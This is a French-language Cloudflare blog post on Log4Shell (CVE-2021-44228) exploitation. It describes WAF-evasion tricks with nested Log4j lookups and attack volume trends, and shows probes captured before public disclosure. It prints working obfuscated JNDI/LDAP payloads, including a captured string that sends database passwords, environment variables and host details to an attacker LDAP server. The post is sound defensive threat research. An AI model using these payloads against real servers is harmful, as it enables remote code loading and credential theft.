<div class="mb2 gray5">7 min read</div>
<div class="post-content lh-copy gray1">
	<p>Dans cette publication, nous étudierons les modèles de contournement des pare-feu WAF et les tentatives d’exfiltration observées dans le monde, les données des tendances des tentatives d’exploitation de la vulnérabilité et les informations concernant l’exploitation que nous avons observées avant la divulgation au public de <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44228">CVE-2021-44228</a>.</p>
	<p>En bref, nous avons assisté à des tests limités de la vulnérabilité le 1er décembre, <em>huit jours avant sa divulgation au public</em>. Nous avons assisté à la <em>première tentative d’exploitation de la vulnérabilité neuf minutes seulement après sa divulgation au public</em>, ce qui démontre la rapidité avec laquelle les auteurs des attaques exploitent les problèmes récemment identifiés.</p>
	<p>Nous observons également des tentatives massives de contournement des pare-feu WAF ayant tenté d’appliquer un blocage simple, et nous observons des tentatives massives d’exfiltration de données, notamment d’identifiants et de mots de passe secrets.</p>
	<h3 id="mod-les-de-contournement-des-pare-feu-waf-et-exemples-d-exfiltration">Modèles de contournement des pare-feu WAF et exemples d’exfiltration</h3>
	<p>Depuis la <a href="https://www.lunasec.io/docs/blog/log4j-zero-day">divulgation</a> de la vulnérabilité CVE-2021-44228 (désormais communément appelée Log4Shell), nous avons observé que les auteurs d’attaques ont évolué de l’utilisation de chaînes d’attaque simples vers des tentatives actives de contournement du blocage par les pare-feu WAF. Les pare-feu WAF constituent un outil utile pour arrêter les auteurs d’attaques externes, et les tentatives de contournement des pare-feu WAF utilisant des règles simplistes sont courantes.</p>
	<p>Lors des premiers stades de l’exploitation de la vulnérabilité Log4j, les auteurs d’attaques ont utilisé des chaînes de caractères non masquées, commençant typiquement par <code>${jndi:dns</code>, <code>${jndi:rmi</code> et <code>${jndi:ldap</code>, et l’utilisation de règles simples pour rechercher ces modèles s’est avérée efficace.</p>
	<p>Peu de temps après que ces chaînes aient été bloquées, les auteurs d’attaques ont commencé à utiliser des techniques de contournement. Ils ont utilisé (et utilisent encore) des techniques de contournement standard (échappement ou codage de caractères), ainsi que des techniques de contournement personnalisées, spécifiques au langage <a href="https://logging.apache.org/log4j/2.x/manual/lookups.html">Log4j Lookups</a>.</p>
	<p>Tout pare-feu WAF efficace est capable de gérer les techniques standard. Les ruses telles que le codage de ${ sous la forme <code>%24%7B</code> ou <code>\u0024\u007b</code> peuvent être facilement inversées avant l’application de règles visant à rechercher l’exploitation de vulnérabilité spécifique actuellement utilisée.</p>
	<p>Cependant, le langage Log4j possède des fonctionnalités riches, permettant de masquer les chaînes de caractères essentielles que recherchent certains pare-feu WAF. Par exemple, la requête <code>${lower}</code> met une chaîne en minuscules. Ainsi, <code>${lower:H}</code> sera remplacée par h. En utilisant les requêtes, les auteurs d’attaques déguisent des chaînes de caractères critiques comme jndi, ce qui leur permet de contourner les pare-feu WAF.</p>
	<p>« Dans la nature », nous constatons l’utilisation de requêtes <code>${date}</code>, <code>${lower}</code>, <code>${upper}</code>, <code>${web}</code>, <code>${main}</code> et <code>${env}</code> aux fins du contournement. En outre, <code>${env}</code>, <code>${sys}</code> et <code>${main}</code> (ainsi que d’autres requêtes spécialisées pour Docker, Kubernetes et d’autres systèmes) sont actuellement utilisées pour exfiltrer des données de l’environnement du processus cible (notamment des données critiques secrètes).</p>
	<p>Pour mieux comprendre comment ce langage est utilisé, voici un petit programme Java qui prend une chaîne sur la ligne de commande et l’insère dans la console via Log4j :</p><!--kg-card-begin: markdown-->
	<pre><code>import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class log4jTester{
    private static final Logger logger = LogManager.getLogger(log4jTester.class);
       
    public static void main(String[] args) {
	logger.error(args[0]);
    }
}
</code></pre>
	<!--kg-card-end: markdown-->
	<p>Ce programme simple écrit dans la console. Ici, il enregistre le mot unique « hide » (masquer).</p><!--kg-card-begin: markdown-->
	<pre><code>$ java log4jTester.java 'hide'          
01:28:25.606 [main] ERROR log4jTester - hide
</code></pre>
	<!--kg-card-end: markdown-->
	<p>Le langage Log4j permet d’utiliser <code>${}</code> à l’intérieur de <code>${}</code> ; les auteurs d’attaques peuvent donc associer plusieurs mots-clés différents à des fins de contournement. Par exemple, l’expression <code>${lower:${lower:h}}${lower:${upper:i}}${lower:D}e</code> serait enregistrée comme « hide » dans un journal. Il est ainsi facile pour l’auteur d’une attaque de contourner la recherche simpliste de ${jndi, par exemple, car les lettres de jndi peuvent être dissimulées de manière similaire.</p><!--kg-card-begin: markdown-->
	<pre><code>$ java log4jTester.java '${lower:${lower:h}}${lower:${upper:i}}${lower:d}e'
01:30:42.015 [main] ERROR log4jTester - hide
</code></pre>
	<!--kg-card-end: markdown-->
	<p>L’autre principale technique de contournement utilise la syntaxe :-. Cette syntaxe permet à l’auteur de l’attaque de définir une valeur par défaut pour une requête et, si la valeur concernée par la requête est vide, la valeur par défaut est renvoyée. Ainsi, par exemple, une requête ciblant une variable d’environnement inexistante peut être utilisée pour afficher les lettres d’un mot.</p><!--kg-card-begin: markdown-->
	<pre><code>$ java log4jTester.java '${env:NOTEXIST:-h}i${env:NOTEXIST:-d}${env:NOTEXIST:-e}' 
01:35:34.280 [main] ERROR log4jTester - hide
</code></pre>
	<!--kg-card-end: markdown-->
	<p>Des techniques similaires sont utilisées avec <code>${web}</code>, <code>${main}</code>, etc., ainsi que des chaînes comme <code>${::-h} ou ${::::::-h}</code>, qui sont toutes deux converties en h. Et, bien entendu, des combinaisons de ces techniques sont employées pour effectuer des tentatives de contournement toujours plus élaborées.</p>
	<p>Pour avoir une idée de l’ampleur du phénomène de contournement, voici un graphique présentant les occurrences de requêtes <code>${jndi</code>: non masquées dans les blocs WAF (ligne orange), l’utilisation de la requête <code>${lower}</code> (ligne verte), l’utilisation de l’encodage d’URI (ligne bleue) et un contournement particulier devenu très prisé <code>${${::-j}${::-n}${::-d}${::-i}</code> (ligne rouge).</p>
	<figure class="kg-card kg-image-card kg-width-wide"><img src="https://blog.cloudflare.com/content/images/2021/12/image--7-.png" class="kg-image" alt="" loading="lazy"></figure>
	<p>Les premiers jours, les phénomènes de contournement étaient relativement rares. Maintenant, toutefois, bien que les chaînes de caractères naïves comme <code>${jndi</code>: restent prisées, le contournement a pris de l’ampleur et les pare-feu WAF doivent bloquer ces attaques améliorées.</p>
	<p>La semaine dernière, nous avons publié un article consacré aux phases initiales de l’exploitation de la vulnérabilité, <a href="https://blog.cloudflare.com/fr-fr/inside-the-log4j2-vulnerability-cve-2021-44228-fr-fr">qui étaient essentiellement de la reconnaissance</a>. Depuis, les auteurs des attaques sont passés à l’extraction de données.</p>
	<p>Nous observons l’utilisation de ${env} pour extraire les variables d’environnement, et de ${sys} pour obtenir des informations sur le système sur lequel s’exécute Log4j. Une attaque interceptée « dans la nature » a tenté d’exfiltrer une grande quantité de données avec différentes requêtes Log4j :</p><!--kg-card-begin: markdown-->
	<pre><code>${${env:FOO:-j}ndi:${lower:L}da${lower:P}://x.x.x.x:1389/FUZZ.HEADER.${docker:
imageName}.${sys:user.home}.${sys:user.name}.${sys:java.vm.version}.${k8s:cont
ainerName}.${spring:spring.application.name}.${env:HOSTNAME}.${env:HOST}.${ctx
:loginId}.${ctx:hostName}.${env:PASSWORD}.${env:MYSQL_PASSWORD}.${env:POSTGRES
_PASSWORD}.${main:0}.${main:1}.${main:2}.${main:3}}
</code></pre>
	<!--kg-card-end: markdown-->
	<p>Ici, vous pouvez consulter l’utilisateur, le répertoire d’origine, le nom de l’image Docker, les détails de Kubernetes et Spring, les mots de passe de l’utilisateur et des bases de données, les noms d’hôte et les arguments de ligne de commande exfiltrés.</p>
	<p>En raison de la sophistication des contournements et des exfiltrations, les fournisseurs de pare-feu WAF doivent examiner toute occurrence de ${ et la traiter comme suspecte. Pour cette raison, nous proposons en plus d’<a href="https://blog.cloudflare.com/fr-fr/log4j-cloudflare-logs-mitigation-fr-fr">aseptiser les journaux</a> que nous transmettons à nos clients pour convertir <code>${</code> en <code>x{</code>.</p>
	<p>L’équipe de gestion du pare-feu WAF de Cloudflare s’efforce continuellement de bloquer les tentatives d’exploitation de la vulnérabilité, mais il reste vital que les clients mettent à jour leurs systèmes avec Log4j ou appliquent des mesures d’atténuation. Étant donné que les données enregistrées ne transitent pas forcément sur Internet, les systèmes ont besoin de correctifs, qu’ils soient ou non connectés à Internet.</p>
	<p>Tous les clients souscripteurs d’offres payantes disposent de règles de pare-feu WAF configurables permettant de les protéger contre CVE-2021-44228, et nous avons également déployé une protection pour nos clients souscripteurs de l’offre gratuite.</p>
	<h3 id="tendances-de-l-exploitation-de-la-vuln-rabilit-cve-2021-44228">Tendances de l’exploitation de la vulnérabilité CVE-2021-44228</h3>
	<p>Cloudflare a rapidement mis en place des règles de pare-feu WAF pour contribuer à bloquer ces attaques. Le graphique suivant présente l’évolution de ces attaques bloquées.</p>
	<figure class="kg-card kg-image-card kg-width-wide"><img src="https://blog.cloudflare.com/content/images/2021/12/image3-39.png" class="kg-image" alt="" loading="lazy"></figure>
	<p>Du 10 au 13 décembre, nous constaté une augmentation du nombre de blocs par minute, comme suit.</p><!--kg-card-begin: markdown-->
	<table>
		<thead>
			<tr>
				<th style="text-align:center">Date</th>
				<th style="text-align:center">Nombre moyen de requêtes bloquées par minute</th>
			</tr>
		</thead>
		<tbody>
			<tr>
				<td style="text-align:center">10-12-2021</td>
				<td style="text-align:center">5 483</td>
			</tr>
			<tr>
				<td style="text-align:center">11-12-2021</td>
				<td style="text-align:center">18 606</td>
			</tr>
			<tr>
				<td style="text-align:center">12-12-2021</td>
				<td style="text-align:center">27 439</td>
			</tr>
			<tr>
				<td style="text-align:center">13-12-2021</td>
				<td style="text-align:center">24 642</td>
			</tr>
		</tbody>
	</table>
	<!--kg-card-end: markdown-->
	<p>Dans notre <a href="https://blog.cloudflare.com/fr-fr/actual-cve-2021-44228-payloads-captured-in-the-wild-fr-fr">publication de blog initiale</a>, nous avons noté que le Canada (la ligne verte ci-dessous) était le premier pays d’origine des tentatives d’exploitation de la vulnérabilité. Comme nous l’avions prévu, cette situation n’a pas perduré et les attaques proviennent du monde entier, soit directement de serveurs, soit via des proxies.</p>
	<figure class="kg-card kg-image-card kg-width-wide"><img src="https://blog.cloudflare.com/content/images/2021/12/image1-72.png" class="kg-image" alt="" loading="lazy"></figure>
	<h3 id="exploitation-de-la-vuln-rabilit-cve-2021-44228-avant-la-divulgation">Exploitation de la vulnérabilité CVE-2021-44228 avant la divulgation</h3>
	<p>CVE-2021-44228 a été divulguée dans un Tweet (désormais supprimé) le 09-12-2021 à 14h25 UTC :</p>
	<figure class="kg-card kg-image-card"><img src="https://blog.cloudflare.com/content/images/2021/12/image2-53.png" class="kg-image" alt="" loading="lazy"></figure>
	<p>Toutefois, nos systèmes ont capturé trois cas de tentative d’exploitation de la vulnérabilité ou d’analyse le 1er décembre 2021, comme suit. Dans chacun de ces cas, j’ai masqué les adresses IP et les noms de domaine. Ces trois cas ont injecté des requêtes <code>${jndi:ldap}</code> dans l’en-tête HTTP User-Agent, dans l’en-tête Referer et dans les paramètres d’URI.</p><!--kg-card-begin: markdown-->
	<pre><code>2021-12-01 03:58:34
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 
    (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36 ${jndi:ldap://rb3w24.example.com/x}
Referer: /${jndi:ldap://rb3w24.example.com/x}
Path: /$%7Bjndi:ldap://rb3w24.example.com/x%7D

2021-12-01 04:36:50
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 
    (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36 ${jndi:ldap://y3s7xb.example.com/x}
Referer: /${jndi:ldap://y3s7xb.example.com/x}
Parameters: x=$%7Bjndi:ldap://y3s7xb.example.com/x%7D						

2021-12-01 04:20:30
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 
    (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36 ${jndi:ldap://vf9wws.example.com/x}
Referer: /${jndi:ldap://vf9wws.example.com/x}	
Parameters: x=$%7Bjndi:ldap://vf9wws.example.com/x%7D	
</code></pre>
	<!--kg-card-end: markdown-->
	<p>Après ces trois tentatives, nous n’avons constaté aucune autre activité jusqu’à neuf minutes après la divulgation publique, lorsqu’une personne a tenté d’injecter une chaîne <code>${jndi:ldap}</code> via un paramètre d’URI sur un site web de jeux.</p><!--kg-card-begin: markdown-->
	<pre><code>2021-12-09 14:34:31
Parameters: redirectUrl=aaaaaaa$aadsdasad$${jndi:ldap://log4.cj.d.example.com/exp}
</code></pre>
	<!--kg-card-end: markdown-->
	<h3 id="conclusion">Conclusion</h3>
	<p>CVE-2021-44228 est activement exploitée par de nombreux acteurs. Les pare-feu WAF sont une mesure efficace pour contribuer à prévenir les attaques venant de l’extérieur, mais ils ne sont pas infaillibles, et les auteurs d’attaques travaillent activement à les contourner. Le potentiel d’exfiltration de données et d’identifiants est incroyablement élevé, et les risques à long terme de piratages et d’attaques plus dévastateurs sont très réels.</p>
	<p>Il est essentiel d’atténuer et de corriger dès maintenant les logiciels affectés qui utilisent Log4j, sans attendre.</p>
</div>